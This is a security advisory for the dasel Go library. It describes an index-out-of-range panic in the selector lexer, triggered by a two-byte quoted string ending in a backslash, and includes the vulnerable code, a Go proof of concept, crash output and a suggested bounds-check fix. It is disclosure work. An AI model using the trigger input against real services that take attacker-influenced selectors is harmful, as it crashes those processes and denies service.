# [H] Dasel: Index-out-of-range panic in dasel selector lexer on trailing backslash in quoted string

## Summary
Severity: High
Advisory: GHSA-m5j3-4634-c2vq
CVE: CVE-2026-46377
CWE: CWE-129
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-m5j3-4634-c2vq
Type: github-advisory

## Affected
- Go: `github.com/tomwright/dasel/v3` — affected >=3.0.0

## Details
### Summary

`dasel`'s selector lexer panics with an index-out-of-range error when tokenizing a quoted string that ends with a trailing backslash (e.g., `"\` or `'\`). A 2-byte input causes an immediate process crash via Go runtime panic.

I confirmed the issue on `v3.3.1` (`fba653c7f248aff10f2b89fca93929b64707dfc8`) and on `master` commit `0dd6132e0c58edbd9b1a5f7ffd00dfab1e6085ad`. I also verified the same code path is present in `v3.0.0` (`648f83baf070d9e00db8ff312febef857ec090a3`). No fix is available yet.

### Details

The bug is in the escape sequence handler within `(*Tokenizer).parseCurRune` in [`selector/lexer/tokenize.go#L191-L194`](https://github.com/TomWright/dasel/blob/fba653c7f248aff10f2b89fca93929b64707dfc8/selector/lexer/tokenize.go#L191-L194):

```go
if p.src[pos] == '\\' {
    pos++
    buf = append(buf, rune(p.src[pos]))  // line 193: no bounds check
    pos++
    continue
}
```

When a backslash is the last character inside quotes, `pos++` increments the position past the end of the input. The subsequent `p.src[pos]` attempts to read past the end of the slice, which Go turns into a runtime panic: `runtime error: index out of range [2] with length 2`.

Notably, the same function already handles unterminated quoted strings by returning `UnexpectedEOFError`, but the escape sequence path does not perform a similar bounds check.

Minimal trigger: `"\` or `'\` (2 bytes)

Test environment:

- MacBook Air (Apple M2), macOS / Darwin `arm64`
- Go `1.26.1`
- dasel `v3.3.1` (`fba653c7f248aff10f2b89fca93929b64707dfc8`)

### PoC

```go
package main

import (
	"fmt"
	"runtime"
	"runtime/debug"

	"github.com/tomwright/dasel/v3/selector/lexer"
)

func main() {
	fmt.Printf("Go version: %s\n", runtime.Version())
	fmt.Printf("GOARCH: %s\n", runtime.GOARCH)
	fmt.Println()

	for _, input := range []string{`"\`, `'\`} {
		fmt.Printf("Input: %s\n", input)
		func() {
			defer func() {
				if r := recover(); r != nil {
					fmt.Printf("PANIC: %v\n", r)
					debug.PrintStack()
				}
			}()
			t := lexer.NewTokenizer(input)
			tokens, err := t.Tokenize()
			if err != nil {
				fmt.Printf("Error: %v\n", err)
			} else {
				fmt.Printf("OK: %d tokens\n", len(tokens))
			}
		}()
		fmt.Println()
	}
}
```

Observed output on `v3.3.1` in the test environment above:

```text
Go version: go1.26.1
GOARCH: arm64

Input: "\
PANIC: runtime error: index out of range [2] with length 2
goroutine 1 [running]:
...
github.com/tomwright/dasel/v3/selector/lexer.(*Tokenizer).parseCurRune(...)
    .../selector/lexer/tokenize.go:193 +0x1c2c
...

Input: '\
PANIC: runtime error: index out of range [2] with length 2
goroutine 1 [running]:
...
github.com/tomwright/dasel/v3/selector/lexer.(*Tokenizer).parseCurRune(...)
    .../selector/lexer/tokenize.go:193 +0x1c2c
...
```

### Impact

An attacker who can control or influence the selector/query string passed to dasel can trigger a Go runtime panic and crash the process unless the caller explicitly recovers from panics.

The selector string is typically provided by the application developer, but there are deployment scenarios where it may be attacker-influenced:
- Web applications using dasel for dynamic data querying
- Applications that construct selectors from user input
- Shared tooling environments where selectors are passed as parameters

### Suggested Fix

Add a bounds check after incrementing `pos` past the backslash, consistent with the existing `UnexpectedEOFError` handling for unterminated quoted strings:

```go
if p.src[pos] == '\\' {
    pos++
    if pos >= p.srcLen {
        return Token{}, &UnexpectedEOFError{Pos: pos}
    }
    buf = append(buf, rune(p.src[pos]))
    pos++
    continue
}
```

## References
- https://github.com/TomWright/dasel/security/advisories/GHSA-m5j3-4634-c2vq
- https://github.com/TomWright/dasel
